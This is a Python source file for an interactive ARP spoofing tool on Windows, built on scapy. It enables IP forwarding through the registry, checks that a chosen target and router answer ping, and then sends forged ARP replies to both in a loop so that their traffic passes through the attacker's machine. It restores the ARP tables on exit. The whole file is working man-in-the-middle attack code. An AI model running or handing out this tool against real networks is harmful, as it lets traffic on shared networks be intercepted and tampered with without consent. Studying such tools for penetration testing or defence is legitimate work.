from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
import scapy.all
import time
import winreg
import subprocess
from Networkscanner import scan, is_ipv4


SPOOF_DELAY=1



# Function to enable IP forwarding on Windows
def enable_ip_forwarding_windows():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        print(f"{Fore.GREEN}[*] IP forwarding enabled successfully on Windows!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] An error occurred while enabling IP forwarding on Windows: {e}{Style.RESET_ALL}")

# Function to disable IP forwarding on Windows
def disable_ip_forwarding_windows():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        print(f"{Fore.GREEN}[*] IP forwarding disabled successfully on Windows!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] An error occurred while disabling IP forwarding on Windows: {e}{Style.RESET_ALL}")

default_ip_forward_value = 0

def arp_spoofing_main():
    # Main function of ARP spoofer
    print(f"{Fore.BLUE}Welcome to ARP Spoofer\n{Style.RESET_ALL}")
    try:
        test = input(f"{Fore.YELLOW}[+] Do you want to scan the network for nodes? (Y/N): {Style.RESET_ALL}")
        if test.lower() == "y":
            while True:
                ip = input("[+] Enter network CIDR notation: ")
                if is_ipv4(ip) == "Scan":
                    print(scan(ip))
                    arp_spoof()
                    break
                else:
                    print(f"{Fore.RED}[!] Please enter a valid CIDR notation{Style.RESET_ALL}")
        elif test.lower() == "n":
            arp_spoof()
        else:
            print(f"{Fore.RED}[!] Enter a valid choice{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Exiting{Style.RESET_ALL}")
        time.sleep(3)

def host_up(ipaddress):
    try:
        # Ping the target IP address
        output = subprocess.check_output(["ping", "-n", "1", ipaddress], universal_newlines=True)
        # Check if the output contains the string "Reply from"
        if "Reply from" in output:
            return True
        else:
            return False
    except subprocess.CalledProcessError:
        return False

def arp_spoof():
    while True:
        target_ip = input("[+] Please enter the target IP address: ")
        if is_ipv4(target_ip) != "Port":
            print(f"{Fore.YELLOW}[!] Please enter a valid IP address{Style.RESET_ALL}")
        else:
            break
    result = host_up(target_ip)
    if not result:
        print(f"{Fore.YELLOW}[!] Target is not up!{Style.RESET_ALL}")
        return
    while True:
        router_ip = input("[+] Enter router IP address: ")
        if is_ipv4(router_ip) != "Port":
            print(f"{Fore.YELLOW}[!] Please enter a valid IP address{Style.RESET_ALL}")
        else:
            break
    result = host_up(router_ip)
    if not result:
        print(f"{Fore.YELLOW}[!] Router/Gateway is down. Please check the gateway IP address{Style.RESET_ALL}")
        return
    # Enable IP forwarding on Windows
    enable_ip_forwarding_windows()
    # Counter for packet send
    counter = 0
    try:
        while True:
            # Spoof target that we are router
            spoof(target_ip, router_ip)
            # Spoof router that we are target
            spoof(router_ip, target_ip)
            # Increase counter
            counter += 2 
            print(f"\r[*] Packets Sent: {Fore.MAGENTA}" + str(counter), end=f"{Style.RESET_ALL}")
            # Sleep for 2 sec
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}\n[*] Restoring target ARP table{Style.RESET_ALL}")
        restore(target_ip, router_ip)
        print(f"{Fore.YELLOW}\n[*] Restoring router ARP table{Style.RESET_ALL}")
        restore(router_ip, target_ip)
        # Disable IP forwarding on Windows
        disable_ip_forwarding_windows()

def spoof(target_ip, spoof_ip_address):
    # Create an ARP packet ARP response
    target_mac = get_mac(target_ip)
    packet = scapy.all.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip_address)
    scapy.all.send(packet, verbose=False)

def is_ipv4(ip):
    # Function to check if the input is an IPv4 address or a CIDR notation
    try:
        ip_parts = ip.split('/')
        if len(ip_parts) == 2:
            if 0 <= int(ip_parts[1]) <= 32:
                return "Scan"
        elif len(ip_parts) == 1:
            parts = ip.split('.')
            if len(parts) == 4:
                if all(0 <= int(part) < 256 for part in parts):
                    return "Port"
    except ValueError:
        pass
    return False

def get_mac(ip):
    try:
        # Get MAC address for the IP address we spoof
        arp_request = scapy.all.ARP(pdst=ip)
        broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")               
        arp_request_broadcast =  broadcast/arp_request
        # In the following request, we will only get one result as we only provided one IP address to map to its MAC address
        answered = scapy.all.srp(arp_request_broadcast, timeout=.5, verbose=0)[0]
        # Return the first element of the list
        return answered[0][1].hwsrc
    except Exception:
        pass

def restore(destination_ip, source_ip):
    # Restoring the ARP table on the target and router side
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # pdst => target IP
    # hwdst => target MAC
    # psrc => pretend to be coming from
    # In this the hwsrc is the actual MAC address of the router
    packet = scapy.all.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # Send crafted Packet
    scapy.all.send(packet, verbose=False)

arp_spoofing_main()
